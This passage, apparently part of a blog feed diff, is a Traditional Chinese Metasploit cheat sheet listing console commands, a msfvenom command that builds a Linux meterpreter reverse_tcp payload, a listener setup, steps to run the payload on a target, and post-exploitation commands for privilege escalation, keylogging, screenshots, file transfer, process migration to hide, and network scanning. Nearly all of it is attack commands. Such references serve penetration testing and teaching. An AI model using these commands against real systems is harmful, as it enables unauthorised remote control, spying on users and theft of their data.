+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br></pre></td></tr></table></figure>
+<p>⭐ 查找模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
+<p>⭐ 模組使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h1 id="payload-基本操作"><a class="header-anchor" href="#payload-基本操作"></a>payload 基本操作</h1>
+<p>⭐ 接口介紹</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">接口</th>
+<th style="text-align:left">說明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">command shell</td>
+<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
+</tr>
+<tr>
+<td style="text-align:left">meterpreter</td>
+<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
+</tr>
+<tr>
+<td style="text-align:left">vnc</td>
+<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
+</tr>
+</tbody>
+</table>
+<p>⭐ 創建 meterpreter payload :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>⭐ 遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.metasploit.com/">metasploit</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Security</tag>
+        <tag>Metasploit</tag>
+        <tag>Nmap</tag>
       </tags>
   </entry>
   <entry>
